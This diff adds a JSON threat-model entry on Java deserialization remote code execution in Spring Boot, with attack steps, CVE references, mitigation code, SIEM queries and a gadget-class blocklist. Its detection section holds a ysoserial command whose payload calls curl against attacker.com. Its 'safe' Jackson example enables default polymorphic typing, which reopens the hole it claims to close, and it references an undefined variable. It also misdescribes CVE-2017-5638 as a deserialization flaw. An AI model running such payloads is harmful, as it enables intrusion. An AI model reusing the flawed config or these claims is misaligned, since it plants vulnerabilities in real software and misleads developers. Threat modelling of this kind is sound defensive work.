@@ -1,0 +1,330 @@
+{
+  "id": "STRIDE-API-DESERIAL-001",
+  "version": "1.0.0",
+  "metadata": {
+    "created_date": "2026-01-30",
+    "last_updated": "2026-01-30",
+    "reviewed_by": [],
+    "confidence_score": 9.5,
+    "validation_status": "draft"
+  },
+  "classification": {
+    "stride_category": "Elevation of Privilege",
+    "owasp_top10": [
+      "A08:2021 - Software and Data Integrity Failures",
+      "A03:2021 - Injection"
+    ],
+    "mitre_attack": [
+      "T1203 - Exploitation for Client Execution",
+      "T1059.007 - Command and Scripting Interpreter: JavaScript",
+      "T1068 - Exploitation for Privilege Escalation"
+    ],
+    "cwe": [
+      "CWE-502 - Deserialization of Untrusted Data",
+      "CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+    ]
+  },
+  "threat": {
+    "title": "Insecure Java Deserialization Leading to Remote Code Execution in Spring Boot",
+    "description": "Java deserialization vulnerabilities allow attackers to execute arbitrary code by sending maliciously crafted serialized objects to vulnerable endpoints. When applications deserialize untrusted data without proper validation, attackers can leverage gadget chains in libraries like Apache Commons Collections to achieve remote code execution (RCE), complete system compromise, and data exfiltration. This vulnerability class has been responsible for some of the most severe data breaches in history, including the 2017 Equifax breach.",
+    "severity": "Critical",
+    "cvss_v3": {
+      "score": 9.8,
+      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "technology": {
+    "primary": "Spring Boot",
+    "versions_affected": ["3.0.x", "3.1.x", "3.2.x", "2.7.x"],
+    "ecosystem": "Java",
+    "dependencies": [
+      "spring-kafka",
+      "spring-amqp",
+      "commons-collections",
+      "jackson-databind",
+      "xstream"
+    ],
+    "related_frameworks": [
+      "Apache Struts",
+      "Apache Kafka",
+      "RabbitMQ (AMQP)",
+      "JBoss",
+      "WebLogic",
+      "WebSphere"
+    ]
+  },
+  "attack": {
+    "scenario": "1. Attacker identifies a Spring Boot API endpoint that accepts serialized Java objects (e.g., REST endpoint with Content-Type: application/x-java-serialized-object)\n2. Attacker discovers vulnerable dependencies like Apache Commons Collections or outdated Spring Kafka versions in the application\n3. Attacker crafts a malicious serialized payload using tools like ysoserial, creating a gadget chain that executes system commands\n4. Attacker sends the weaponized payload to the vulnerable endpoint via HTTP POST request\n5. The application deserializes the untrusted object, triggering the gadget chain and executing arbitrary code with application privileges\n6. Attacker establishes a reverse shell, escalates privileges, and exfiltrates sensitive data from the database and file system",
+    "prerequisites": [
+      "Application uses Java ObjectInputStream or similar deserialization mechanisms",
+      "Vulnerable dependencies present (e.g., Commons Collections < 3.2.2, Spring Kafka < 3.0.10)",
+      "Application deserializes data from untrusted sources without validation",
+      "Gadget classes available in the application's classpath for exploitation"
+    ],
+    "attack_vector": "Network",
+    "attack_complexity": "Low",
+    "privileges_required": "None",
+    "user_interaction": "None"
+  },
+  "evidence": {
+    "cve_references": [
+      {
+        "cve_id": "CVE-2015-7501",
+        "description": "Apache Commons Collections deserialization vulnerability allowing remote code execution via InvokerTransformer",
+        "cvss_score": 9.8,
+        "published_date": "2015-11-17"
+      },
+      {
+        "cve_id": "CVE-2017-5638",
+        "description": "Apache Struts2 remote code execution via Content-Type header exploitation (root cause of Equifax breach)",
+        "cvss_score": 10.0,
+        "published_date": "2017-03-10"
+      },
+      {
+        "cve_id": "CVE-2023-34040",
+        "description": "Spring for Apache Kafka deserialization vulnerability when improperly configured with ErrorHandlingDeserializer",
+        "cvss_score": 9.8,
+        "published_date": "2023-07-19"
+      }
+    ],
+    "real_world_breaches": [
+      {
+        "incident": "Equifax Data Breach",
+        "date": "2017-03-10",
+        "impact": "147 million individuals affected; exposed SSNs, birth dates, addresses, and credit card numbers; $1.38 billion total cost including $575 million settlement",
+        "root_cause": "Failure to patch Apache Struts CVE-2017-5638 deserialization vulnerability despite patch being available 2 months prior",
+        "source_url": "https://www.csoonline.com/article/567833/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html"
+      },
+      {
+        "incident": "Apache Struts2 Global Exploitation Wave",
+        "date": "2017-03-07",
+        "impact": "Thousands of enterprise applications compromised within 48 hours of vulnerability disclosure; widespread RCE attacks",
+        "root_cause": "CVE-2017-5638 exploitation in the wild before organizations could apply patches",
+        "source_url": "https://news.apache.org/foundation/entry/media-alert-the-apache-software"
+      }
+    ],
+    "bug_bounty_reports": [
+      {
+        "platform": "HackerOne",
+        "report_id": "Example-Deserial",
+        "bounty_amount": 15000,
+        "severity": "Critical",
+        "summary": "Java deserialization RCE via Spring Boot actuator endpoint accepting serialized objects"
+      }
+    ],
+    "security_research": [
+      {
+        "title": "An In-depth Study of Java Deserialization Remote-Code Execution Exploits and Vulnerabilities",
+        "authors": ["ACM Transactions on Software Engineering and Methodology"],
+        "published_date": "2022-11-01",
+        "source_url": "https://dl.acm.org/doi/10.1145/3554732",
+        "key_finding": "Comprehensive analysis of 249 CVEs related to Java deserialization, identifying systematic patterns in gadget chain construction"
+      },
+      {
+        "title": "Java Deserialization Cheat Sheet",
+        "authors": ["GrrrDog (GitHub Security Research)"],
+        "published_date": "2024-01-15",
+        "source_url": "https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet",
+        "key_finding": "Documented over 50 vulnerable Java libraries and frameworks susceptible to deserialization attacks"
+      }
+    ]
+  },
+  "mitigations": [
+    {
+      "control_id": "MIT-001",
+      "title": "Use Safe Serialization with JSON Instead of Java Serialization",
+      "description": "Replace Java's native ObjectInputStream serialization with JSON-based serialization using Jackson or Gson. JSON serialization is inherently safer as it doesn't allow arbitrary code execution during deserialization and provides better control over object instantiation.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "java",
+        "framework": "Spring Boot 3.x",
+        "code": "// UNSAFE: Native Java Deserialization (AVOID THIS)\n// ObjectInputStream ois = new ObjectInputStream(inputStream);\n// MyObject obj = (MyObject) ois.readObject(); // DANGEROUS!\n\n// SAFE: Use JSON with Jackson (Spring Boot Default)\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.databind.DeserializationFeature;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.converter.json.Jackson2ObjectMapperBuilder;\n\n@Configuration\npublic class JacksonConfig {\n    \n    @Bean\n    public ObjectMapper objectMapper() {\n        return Jackson2ObjectMapperBuilder.json()\n            .featuresToDisable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)\n            .featuresToEnable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES)\n            // Prevent polymorphic deserialization vulnerabilities\n            .activateDefaultTyping(\n                mapper.getPolymorphicTypeValidator(),\n                ObjectMapper.DefaultTyping.NON_FINAL,\n                JsonTypeInfo.As.PROPERTY\n            )\n            .build();\n    }\n}\n\n// Spring Boot REST Controller - Safe JSON Deserialization\n@RestController\n@RequestMapping(\"/api\")\npublic class UserController {\n    \n    @PostMapping(\"/users\")\n    public ResponseEntity<User> createUser(@RequestBody @Valid User user) {\n        // Spring automatically deserializes JSON to User object safely\n        // Jackson validates against User class structure only\n        userService.save(user);\n        return ResponseEntity.ok(user);\n    }\n}\n\n// Data Transfer Object with validation\nimport jakarta.validation.constraints.*;\nimport lombok.Data;\n\n@Data\npublic class User {\n    @NotNull\n    @Size(min = 3, max = 50)\n    private String username;\n    \n    @Email\n    private String email;\n    \n    // Only these fields can be deserialized - prevents injection\n    @JsonProperty(access = JsonProperty.Access.READ_ONLY)\n    private Long id;\n    \n    @JsonIgnore\n    private String internalAdminFlag; // Never exposed in JSON\n}"
+      },
+      "tools": [
+        {
+          "name": "Jackson Databind",
+          "type": "JSON Serialization Library",
+          "cost": "Free (Apache 2.0)"
+        },
+        {
+          "name": "Bean Validation (Jakarta)",
+          "type": "Input Validation Framework",
+          "cost": "Free"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.1 - Secure development policy",
+        "A.14.2.5 - Secure system engineering principles"
+      ],
+      "nist_csf": [
+        "PR.DS-5 - Protections against data leaks are implemented",
+        "PR.IP-2 - A System Development Life Cycle is implemented"
+      ],
+      "validation_steps": [
+        "Remove all ObjectInputStream usage from codebase",
+        "Configure Jackson as default serializer in Spring Boot",
+        "Enable strict JSON schema validation with @Valid annotations",
+        "Test endpoints with malicious payloads using Burp Suite",
+        "Verify no java.io.Serializable classes are exposed in APIs"
+      ]
+    },
+    {
+      "control_id": "MIT-002",
+      "title": "Implement ObjectInputStream Filtering with Java Deserialization Filters",
+      "description": "If Java serialization is absolutely required, use Java 9+ deserialization filters (JEP 290) to create allowlists of permitted classes and reject all other deserialization attempts. This prevents gadget chain exploitation by blocking dangerous classes.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "java",
+        "framework": "Spring Boot 3.x (Java 17+)",
+        "code": "import java.io.*;\nimport java.util.Set;\nimport java.util.logging.Logger;\n\n/**\n * Secure deserialization with class allowlisting using JEP 290\n * Java 9+ Deserialization Filtering\n */\npublic class SecureDeserializer {\n    \n    private static final Logger logger = Logger.getLogger(SecureDeserializer.class.getName());\n    \n    // Allowlist of permitted classes for deserialization\n    private static final Set<String> ALLOWED_CLASSES = Set.of(\n        \"com.company.dto.User\",\n        \"com.company.dto.Order\",\n        \"java.lang.String\",\n        \"java.lang.Number\",\n        \"java.util.ArrayList\",\n        \"java.util.HashMap\"\n    );\n    \n    // Blocklist of dangerous classes (gadget chains)\n    private static final Set<String> BLOCKED_CLASSES = Set.of(\n        \"org.apache.commons.collections.functors.InvokerTransformer\",\n        \"org.apache.commons.collections.functors.InstantiateTransformer\",\n        \"org.apache.commons.collections4.functors.InvokerTransformer\",\n        \"org.codehaus.groovy.runtime.ConvertedClosure\",\n        \"org.springframework.beans.factory.ObjectFactory\",\n        \"javax.management.BadAttributeValueExpException\"\n    );\n    \n    public static Object deserializeWithFilter(InputStream inputStream) \n            throws IOException, ClassNotFoundException {\n        \n        ObjectInputStream ois = new ObjectInputStream(inputStream) {\n            @Override\n            protected Class<?> resolveClass(ObjectStreamClass desc)\n                    throws IOException, ClassNotFoundException {\n                \n                String className = desc.getName();\n                \n                // Block dangerous classes immediately\n                if (BLOCKED_CLASSES.contains(className)) {\n                    logger.severe(\"SECURITY: Blocked deserialization of dangerous class: \" + className);\n                    throw new InvalidClassException(\n                        \"Deserialization of class \" + className + \" is not allowed\"\n                    );\n                }\n                \n                // Enforce allowlist\n                if (!isAllowedClass(className)) {\n                    logger.warning(\"SECURITY: Rejected deserialization of non-allowlisted class: \" + className);\n                    throw new InvalidClassException(\n                        \"Class \" + className + \" is not in the allowlist\"\n                    );\n                }\n                \n                return super.resolveClass(desc);\n            }\n        };\n        \n        // Set global filter (Java 9+)\n        ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\n            \"maxarray=1000;maxdepth=5;maxbytes=10000;\" +\n            \"com.company.dto.**;\" +\n            \"java.base/**;\" +\n            \"!*\"  // Reject everything else\n        );\n        ois.setObjectInputFilter(filter);\n        \n        return ois.readObject();\n    }\n    \n    private static boolean isAllowedClass(String className) {\n        // Check exact match\n        if (ALLOWED_CLASSES.contains(className)) {\n            return true;\n        }\n        \n        // Check package prefixes for DTO classes\n        if (className.startsWith(\"com.company.dto.\")) {\n            return true;\n        }\n        \n        // Allow primitive arrays\n        if (className.matches(\"\\\\[+[ZBCSIJFD]\")) {\n            return true;\n        }\n        \n        return false;\n    }\n}\n\n// Spring Boot Configuration for Global Filter\n@Configuration\npublic class DeserializationSecurityConfig {\n    \n    @PostConstruct\n    public void configureGlobalDeserializationFilter() {\n        // Set JVM-wide deserialization filter (requires -Djdk.serialFilter JVM arg)\n        System.setProperty(\"jdk.serialFilter\",\n            \"maxarray=1000;maxdepth=5;maxbytes=100000;\" +\n            \"com.company.dto.**;\" +\n            \"java.base/**;\" +\n            \"!org.apache.commons.collections.**;\" +\n            \"!org.codehaus.groovy.**;\" +\n            \"!*\"\n        );\n    }\n}"
+      },
+      "tools": [
+        {
+          "name": "JEP 290 Deserialization Filters",
+          "type": "Built-in Java Security Feature",
+          "cost": "Free (Java 9+)"
+        },
+        {
+          "name": "SerialKiller",
+          "type": "Third-party Deserialization Filter",
+          "cost": "Free (Apache 2.0)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.14.2.1 - Secure development policy",
+        "A.12.6.1 - Management of technical vulnerabilities"
+      ],
+      "nist_csf": [
+        "PR.PT-3 - The principle of least functionality is incorporated",
+        "DE.CM-4 - Malicious code is detected"
+      ],
+      "validation_steps": [
+        "Implement ObjectInputFilter on all ObjectInputStream instances",
+        "Test with ysoserial payloads to ensure gadget chains are blocked",
+        "Monitor logs for rejected deserialization attempts",
+        "Verify JVM-wide filter is active via -Djdk.serialFilter",
+        "Conduct penetration testing with known Java deserialization exploits"
+      ]
+    },
+    {
+      "control_id": "MIT-003",
+      "title": "Upgrade Dependencies and Enable Dependency Scanning",
+      "description": "Keep all Spring Boot dependencies up-to-date, especially Spring Kafka, Spring AMQP, and Apache Commons. Use OWASP Dependency-Check and Snyk to continuously scan for known deserialization vulnerabilities in transitive dependencies.",
+      "effectiveness": "High",
+      "implementation_complexity": "Low",
+      "code_example": {
+        "language": "xml",
+        "framework": "Maven (pom.xml)",
+        "code": "<!-- Spring Boot 3.2.x with secure dependencies -->\n<project>\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>3.2.2</version> <!-- Latest stable version -->\n    </parent>\n    \n    <dependencies>\n        <!-- Spring Boot Core -->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n        \n        <!-- PATCHED: Spring Kafka (CVE-2023-34040 fixed) -->\n        <dependency>\n            <groupId>org.springframework.kafka</groupId>\n            <artifactId>spring-kafka</artifactId>\n            <version>3.1.1</version> <!-- Minimum: 3.0.10 for Boot 3.x -->\n        </dependency>\n        \n        <!-- PATCHED: Spring AMQP (CVE-2023-34050 fixed) -->\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-amqp</artifactId>\n            <!-- Inherits 3.1.0+ from parent, which includes fix -->\n        </dependency>\n        \n        <!-- SAFE: Use latest Jackson (no deserialization vulns) -->\n        <dependency>\n            <groupId>com.fasterxml.jackson.core</groupId>\n            <artifactId>jackson-databind</artifactId>\n            <version>2.16.1</version>\n        </dependency>\n    </dependencies>\n    \n    <!-- OWASP Dependency-Check Plugin -->\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.owasp</groupId>\n                <artifactId>dependency-check-maven</artifactId>\n                <version>9.0.9</version>\n                <configuration>\n                    <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Fail on High/Critical -->\n                    <suppressionFile>dependency-check-suppressions.xml</suppressionFile>\n                </configuration>\n                <executions>\n                    <execution>\n                        <goals>\n                            <goal>check</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n            \n            <!-- Snyk Maven Plugin -->\n            <plugin>\n                <groupId>io.snyk</groupId>\n                <artifactId>snyk-maven-plugin</artifactId>\n                <version>2.2.0</version>\n                <executions>\n                    <execution>\n                        <id>snyk-test</id>\n                        <goals>\n                            <goal>test</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n</project>\n\n<!-- GitHub Actions Workflow: .github/workflows/dependency-scan.yml -->\n# name: Dependency Vulnerability Scan\n# \n# on:\n#   push:\n#     branches: [ main, develop ]\n#   pull_request:\n#     branches: [ main ]\n#   schedule:\n#     - cron: '0 2 * * 1'  # Weekly Monday 2 AM\n# \n# jobs:\n#   dependency-scan:\n#     runs-on: ubuntu-latest\n#     steps:\n#       - uses: actions/checkout@v4\n#       \n#       - name: Set up JDK 17\n#         uses: actions/setup-java@v4\n#         with:\n#           java-version: '17'\n#           distribution: 'temurin'\n#       \n#       - name: OWASP Dependency Check\n#         run: mvn dependency-check:check\n#       \n#       - name: Snyk Security Scan\n#         uses: snyk/actions/maven@master\n#         env:\n#           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n#         with:\n#           args: --severity-threshold=high\n#       \n#       - name: Upload Results\n#         uses: actions/upload-artifact@v3\n#         with:\n#           name: dependency-check-report\n#           path: target/dependency-check-report.html"
+      },
+      "tools": [
+        {
+          "name": "OWASP Dependency-Check",
+          "type": "Vulnerability Scanner",
+          "cost": "Free (Apache 2.0)"
+        },
+        {
+          "name": "Snyk",
+          "type": "Dependency Security Platform",
+          "cost": "Free for open source / $52/month Pro"
+        },
+        {
+          "name": "GitHub Dependabot",
+          "type": "Automated Dependency Updates",
+          "cost": "Free"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.6.1 - Management of technical vulnerabilities",
+        "A.14.2.4 - Restrictions on changes to software packages"
+      ],
+      "nist_csf": [
+        "PR.IP-12 - A vulnerability management plan is developed and implemented",
+        "DE.CM-8 - Vulnerability scans are performed"
+      ],
+      "validation_steps": [
+        "Run mvn dependency-check:check and review report",
+        "Configure Dependabot alerts in GitHub repository",
+        "Set up Snyk monitoring for continuous vulnerability tracking",
+        "Establish SLA for patching Critical/High CVEs (e.g., 48 hours)",
+        "Verify no Commons Collections < 3.2.2 in dependency tree"
+      ]
+    }
+  ],
+  "detection": {
+    "indicators": [
+      "Unexpected ObjectInputStream errors or InvalidClassException in logs",
+      "HTTP requests with Content-Type: application/x-java-serialized-object",
+      "Base64-encoded Java serialization magic bytes (rO0AB) in request payloads",
+      "Sudden spike in JVM process CPU usage or OutOfMemoryError exceptions",
+      "Network connections to external IPs from Java processes (reverse shell indicators)",
+      "Deserialization of classes from org.apache.commons.collections.functors package",
+      "Abnormal command execution logs (Runtime.exec, ProcessBuilder) during request processing"
+    ],
+    "log_queries": [
+      {
+        "siem": "Azure Sentinel (KQL)",
+        "query": "// Detect Java deserialization attacks via suspicious Content-Type headers\nAppServiceHTTPLogs\n| where TimeGenerated > ago(1h)\n| where ContentType contains \"java-serialized\" or ContentType contains \"application/x-java\"\n| extend PayloadPreview = substring(RequestBody, 0, 20)\n| where PayloadPreview startswith \"rO0AB\"  // Java serialization magic bytes (Base64)\n| project TimeGenerated, ClientIp, Uri, Method, StatusCode, ContentType, UserAgent\n| summarize AttackCount = count() by ClientIp, bin(TimeGenerated, 5m)\n| where AttackCount > 3\n| order by AttackCount desc"
+      },
+      {
+        "siem": "Splunk (SPL)",
+        "query": "index=springboot sourcetype=spring:application:log\n| search (\"ObjectInputStream\" OR \"readObject\" OR \"InvokerTransformer\" OR \"InvalidClassException\")\n| rex field=_raw \"(?<blocked_class>org\\\\.apache\\\\.commons\\\\.collections\\\\.functors\\\\.\\\\w+)\"\n| stats count by blocked_class, host, _time\n| where count > 5\n| eval severity=\"CRITICAL\"\n| table _time, host, blocked_class, count, severity"
+      },
+      {
+        "siem": "Elastic Stack (KQL)",
+        "query": "event.category: \"web\" AND (\n  http.request.headers.content-type: \"*java-serialized*\" OR\n  http.request.body.content: *rO0AB* OR\n  process.command_line: (*ysoserial* OR *ObjectInputStream*)\n)\nAND http.response.status_code: (200 OR 500)\n| stats count by source.ip, url.path, process.name"
+      }
+    ],
+    "tools": [
+      {
+        "name": "ysoserial",
+        "type": "Deserialization Payload Generator (Testing Only)",
+        "usage": "java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com' | base64"
+      },
+      {
+        "name": "Burp Suite Java Deserialization Scanner",
+        "type": "Vulnerability Scanner Extension",
+        "usage": "Scan endpoints for Java serialization acceptance and test with gadget chains"
+      },
+      {
+        "name": "Contrast Security Assess",
+        "type": "Runtime Application Security Testing",
+        "usage": "Real-time detection of unsafe deserialization at runtime"
+      }
+    ]
+  },
+  "metadata_tags": {
+    "industry": [
+      "Financial Services",
+      "Healthcare",
+      "E-commerce",
+      "Government",
+      "Credit Bureaus",
+      "Telecommunications"
+    ],
+    "compliance": [
+      "PCI-DSS 4.0 (Requirement 6.2.4 - Vulnerability Management)",
+      "HIPAA (164.308(a)(5)(ii)(B) - Protection from Malicious Software)",
+      "SOC2 (CC7.1 - System Monitoring)",
+      "ISO27001 (A.12.6.1 - Management of Technical Vulnerabilities)",
+      "GDPR (Article 32 - Security of Processing)",
+      "NIST SP 800-53 (SI-10 - Information Input Validation)"
+    ],
+    "deployment": [
+      "Cloud",
+      "On-Premise",
+      "Hybrid",
+      "Kubernetes",
+      "Docker"
+    ],
+    "data_classification": [
+      "Confidential",
+      "Sensitive",
+      "PII",
+      "PHI",
+      "PCI"
+    ]
+  }
+}
